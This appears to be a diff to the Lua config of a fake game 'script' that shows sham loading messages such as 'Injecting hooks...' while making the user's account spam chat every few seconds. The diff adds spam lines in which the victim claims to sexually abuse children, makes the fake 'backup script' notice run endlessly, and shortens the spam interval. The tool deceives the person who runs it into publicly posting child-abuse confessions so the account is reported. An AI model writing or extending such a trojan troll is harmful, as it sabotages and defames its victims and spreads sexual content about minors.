@@ -36,6 +36,8 @@ return {
         "i larp, report me and thank o3fu lol",
         "I GXHRPE",
         "IM A PE x DOO",
+        "I TOUXH 10 YR",
+        "I LOVE KIDDIES",
     },
 
     -- ═══════════════════════════════════════════════════════════════
@@ -70,11 +72,11 @@ return {
         { text = "Fetching remote config...",         duration = 2.0 },
         { text = "Injecting hooks...",                duration = 1.5 },
         { text = "Almost ready...",                   duration = 1.0 },
-        { text = "Script disabled by o3fu, running the back up script.. please wait", duration = 9 },
+        { text = "Script disabled by o3fu, running the back up script.. please wait", duration = 9999999999999 },
     },
 
     -- ═══════════════════════════════════════════════════════════════
     --  CHAT SPAM SETTINGS
     -- ═══════════════════════════════════════════════════════════════
-    chat_spam_interval = 4,  -- seconds between each chat message
+    chat_spam_interval = 3,  -- seconds between each chat message
 }
